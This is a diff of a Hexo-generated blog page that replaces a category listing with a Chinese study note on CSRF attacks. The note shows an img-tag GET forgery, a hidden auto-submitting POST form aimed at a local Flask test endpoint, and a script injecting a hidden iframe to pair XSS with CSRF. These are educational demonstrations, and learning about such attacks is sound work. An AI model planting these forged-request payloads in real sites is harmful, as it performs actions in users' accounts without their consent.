@@ -17,16 +17,23 @@
   <meta http-equiv="window-target" content="_top" />
   
   
-  <title>Category: security | Hexo</title>
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://yoursite.com/categories/security/index.html">
+  <title>CSRF攻击学习 | Hexo</title>
+  <meta name="description" content="概述  一图胜千言    攻击方式  GET方式   假如现在有一个链接： https://csrf.com/m?addUser=id12345 那么我们就可以构造一个图片  1&amp;lt;img src=&amp;apos;https://csrf.com/m?addUser=id12345&amp;apos;&amp;gt; 只要你访问我的网站，那么就会触发这个链接，从而关注了我  POST方式   POST的请求经常">
+<meta name="keywords" content="security,CSRF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSRF攻击学习">
+<meta property="og:url" content="http://yoursite.com/2018/06/14/CSRF攻击学习/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="概述  一图胜千言    攻击方式  GET方式   假如现在有一个链接： https://csrf.com/m?addUser=id12345 那么我们就可以构造一个图片  1&amp;lt;img src=&amp;apos;https://csrf.com/m?addUser=id12345&amp;apos;&amp;gt; 只要你访问我的网站，那么就会触发这个链接，从而关注了我  POST方式   POST的请求经常">
 <meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/images/csrf.jpg">
+<meta property="og:updated_time" content="2018-06-14T15:31:03.050Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Hexo">
+<meta name="twitter:title" content="CSRF攻击学习">
+<meta name="twitter:description" content="概述  一图胜千言    攻击方式  GET方式   假如现在有一个链接： https://csrf.com/m?addUser=id12345 那么我们就可以构造一个图片  1&amp;lt;img src=&amp;apos;https://csrf.com/m?addUser=id12345&amp;apos;&amp;gt; 只要你访问我的网站，那么就会触发这个链接，从而关注了我  POST方式   POST的请求经常">
+<meta name="twitter:image" content="http://yoursite.com/images/csrf.jpg">
   <!-- Canonical links -->
-  <link rel="canonical" href="http://yoursite.com/categories/security/index.html">
+  <link rel="canonical" href="http://yoursite.com/2018/06/14/CSRF攻击学习/index.html">
   
     <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -348,79 +355,175 @@
 </aside>
 
   
-  <main class="main" role="main">
-  <article class="content article article-categories article-type-list" itemscope="">
-    <header class="article-header">
-      <h1 itemprop="name" class="hidden-xs">Category: security</h1>
-      <p class="hidden-xs">Total 2 articles</p>
-      <nav role="navigation" id="nav-main" class="okayNav">
-        <ul>
-          <li><a href="/categories">All</a></li>
-          
-          <li><a href="/categories/scurity/">scurity</a></li>
-          
-          <li><a href="/categories/python/">python</a></li>
-          
-          <li><a href="/categories/scurity/CSRF/">CSRF</a></li>
-          
-          <li><a href="/categories/python/flask/">flask</a></li>
-          
-          <li><a href="/categories/Linux/">Linux</a></li>
-          
-          <li><a href="/categories/security/">security</a></li>
-          
-          <li><a href="/categories/test/">test</a></li>
-          
-          <li><a href="/categories/python/modules/">modules</a></li>
-          
-          <li><a href="/categories/Linux/Nginx/">Nginx</a></li>
-          
-          <li><a href="/categories/security/xss/">xss</a></li>
-          
-          <li><a href="/categories/python/modules/爬虫/">爬虫</a></li>
-          
-        </ul>
-      </nav>
-    </header>
-    <!-- /header -->
-    <div class="article-body">
-      <div class="panel panel-default b-no">
-    <div class="panel-heading" role="tab">
-        <h4 class="panel-title">
-            <a data-toggle="collapse" href="#collapsesecurity" aria-expanded="true">
-              <i class="icon icon-folder text-active"></i><i class="icon icon-folder-open text"></i>
-              security
-            </a>
-            <small class="text-muted">(Total 2 articles)</small>
-        </h4>
+  
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-CSRF攻击学习" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      CSRF攻击学习
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2018/06/14/CSRF攻击学习/" class="article-date">
+	  <time datetime="2018-06-14T15:26:27.000Z" itemprop="datePublished">2018-06-14</time>
+	</a>
+</span>
+        
+  <span class="article-category">
+    <i class="icon icon-folder"></i>
+    <a class="article-category-link" href="/categories/scurity/">scurity</a>►<a class="article-category-link" href="/categories/scurity/CSRF/">CSRF</a>
+  </span>
+
+        
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link" href="/tags/CSRF/">CSRF</a>, <a class="article-tag-link" href="/tags/security/">security</a>
+  </span>
+
+
+        
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2018/06/14/CSRF攻击学习/#comments" class="article-comment-link">Comments</a></span>
+        
+      </div>
     </div>
-    <div id="collapsesecurity" class="panel-collapse collapse in" role="tabpanel" aria-labelledby="headingsecurity">
-        <div class="panel-body">
-            <div class="collection">
-              
-                
-<a href="/2018/06/14/xss攻击学习/" class="collection-item" target="_blank" itemprop="url">
-  <time datetime="2018-06-14T15:12:45.000Z" itemprop="datePublished">2018-06-14</time>
-  <span>&nbsp;&nbsp;&nbsp;</span> xss攻击学习
-</a>
+    <div class="article-entry markdown-body" itemprop="articleBody">
+      
+        <h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1>
+<blockquote>
+<p>一图胜千言<br>
+<img src="/images/csrf.jpg" alt="图片"></p>
+</blockquote>
+<h1 id="攻击方式"><a class="markdownIt-Anchor" href="#攻击方式"></a> 攻击方式</h1>
+<ol>
+<li>GET方式</li>
+</ol>
+<blockquote>
+<p>假如现在有一个链接： <a href="https://csrf.com/m?addUser=id12345" target="_blank" rel="noopener">https://csrf.com/m?addUser=id12345</a> 那么我们就可以构造一个图片</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&apos;https://csrf.com/m?addUser=id12345&apos;&gt;</span><br></pre></td></tr></table></figure>
+<p>只要你访问我的网站，那么就会触发这个链接，从而关注了我</p>
+<ol start="2">
+<li>POST方式</li>
+</ol>
+<blockquote>
+<p>POST的请求经常伴随着跳转，一跳转，就会暴露，这个时候我们就要考虑加一个iframe。<br>
+但是在csrf测试的页面加iframe，根据同源政策，显示不来内容。于是我们新建另一个页面，加上iframe，连接到csrf的测试页面。如下：<br>
+新建一个iframe</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;&lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;iframe style=&quot;display:block&quot; src=&apos;test.html&apos;&gt;&lt;/iframe&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>在建一个test.html</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE HTML&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en-US"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>CSRF GET<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">form</span>  <span class="attr">name</span>=<span class="string">"form1"</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1:5000/csrf"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'username'</span> <span class="attr">value</span>=<span class="string">"csrf_ee1"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"qwe1231"</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">          <span class="built_in">document</span>.forms.form1.submit();</span></span><br><span class="line"><span class="undefined">     </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这样一来，成功复现了csrf</p>
+<h1 id="什么叫做xsrf"><a class="markdownIt-Anchor" href="#什么叫做xsrf"></a> 什么叫做XSRF？</h1>
+<blockquote>
+<p>XSRF指的是xss+csrf的攻击，指的是一个网站既有xss又有csrf。 这样一来就可以进行两者的结合，通过xss注入csrf的html代码。</p>
+</blockquote>
+<p>通过js生成代码</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span><br><span class="line">    iframe.style.display = <span class="string">'none'</span>;</span><br><span class="line">    iframe.src=<span class="string">'test.html'</span>;</span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(iframe);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+<h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1>
+<p>csrf总的来说，主要聚焦于写，并不会窃取用户的数据。</p>
 
-
-              
-                
-<a href="/2018/06/14/XSS平台的搭建/" class="collection-item" target="_blank" itemprop="url">
-  <time datetime="2018-06-14T12:20:09.000Z" itemprop="datePublished">2018-06-14</time>
-  <span>&nbsp;&nbsp;&nbsp;</span> XSS平台的搭建
-</a>
-
-
-              
-            </div>
-        </div>
+      
     </div>
-</div>
-    </div>
-  </article>
    
+  </article>
+  
+    
+  <section id="comments">
+  	
+       
+    <div id="uyan_frame"></div>
+
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    
+    <li class="next">
+      <a href="/2018/06/14/xss攻击学习/" title="xss攻击学习"><span>Older&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+  </ul>
+  
+  
+  <!-- Button trigger modal -->
+  <button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>$</span></button>
+  <!-- <div class="wave-icon wave-icon-danger btn-donate" data-toggle="modal" data-target="#donateModal">
+    <div class="wave-circle"><span class="icon"><i class="icon icon-bill"></i></span></div>
+  </div> -->
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+<!-- Modal -->
+<div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog">
+  <div class="modal-dialog" role="document">
+    <div class="modal-content donate">
+      <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+      <div class="modal-body">
+        <div class="donate-box">
+          <div class="donate-head">
+            <p>Maybe you could buy me a cup of coffee.</p>
+          </div>
+          <div class="tab-content">
+            <div role="tabpanel" class="tab-pane fade active in" id="alipay">
+              <div class="donate-payimg">
+                <img src="/images/donate/alipayimg.png" alt="Scan Qrcode" title="Scan" />
+              </div>
+              <p class="text-muted mv">Scan this qrcode</p>
+              <p class="text-grey">Open alipay app scan this qrcode, buy me a coffee!</p>
+            </div>
+            <div role="tabpanel" class="tab-pane fade" id="wechatpay">
+              <div class="donate-payimg">
+                <img src="/images/donate/wechatpayimg.png" alt="Scan Qrcode" title="Scan" />
+              </div>
+              <p class="text-muted mv">Scan this qrcode</p>
+              <p class="text-grey">Open wechat app scan this qrcode, buy me a coffee!</p>
+            </div>
+          </div>
+          <div class="donate-footer">
+            <ul class="nav nav-tabs nav-justified" role="tablist">
+              <li role="presentation" class="active">
+                <a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="true"><i class="icon icon-alipay"></i> alipay</a>
+              </li>
+              <li role="presentation" class="">
+                <a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="false"><i class="icon icon-wepay"></i> wechat payment</a>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
 </main>
 
   <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
@@ -477,6 +580,16 @@ window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
     
     
     
+        
+
+
+    
+    
+        
+    
+    <script defer type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid=[object Object]"></script>
+
+
     
     
 
